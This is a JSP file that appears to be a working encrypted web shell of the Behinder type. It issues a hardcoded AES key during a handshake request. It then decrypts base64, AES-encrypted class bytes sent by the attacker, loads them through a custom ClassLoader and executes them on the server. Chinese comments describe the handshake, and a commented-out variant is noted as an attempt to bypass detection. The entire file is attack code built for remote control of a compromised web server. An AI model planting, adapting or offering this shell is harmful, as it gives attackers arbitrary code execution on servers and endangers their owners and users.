<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{
	U(ClassLoader c){
		super(c);
	}
	public Class g(byte []b){
		return super.defineClass(b,0,b.length);
	}
}
%>

<%if(session.getAttribute("u")==null){
String k = "8c25dfbedf9e402a";
session.setAttribute("u",k);
out.print(k);
return;//执行流返回，握手请求时，只产生密钥，后续的代码不再执行
}


/*
//request中的getRead() 和 getInputStream()在读取一次后标记为-1，无法再次被读取
//输入缓冲区
InputStream in = request.getInputStream();
//字节数组输出流在内存中创建一个字节数组缓冲区
//所有发送到输出流的数据保存在该字节数组缓冲区中。
ByteArrayOutputStream Stream = new ByteArrayOutputStream();
int ch;
while ((ch = in.read()) != -1) {
	//将输入写入输出缓冲去中。多一个步骤 尝试绕过
 Stream.write(ch);
}
*/
Cipher c=Cipher.getInstance("AES");//指定AES加解密套件
c.init(2,new SecretKeySpec((session.getAttribute("u")+"").getBytes(),"AES"));

/*
new U(this.getClass().getClassLoader()).g(c.doFinal(Stream.toByteArray())).newInstance().equals(pageContext);
//没做base64解码
*/
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);


%>

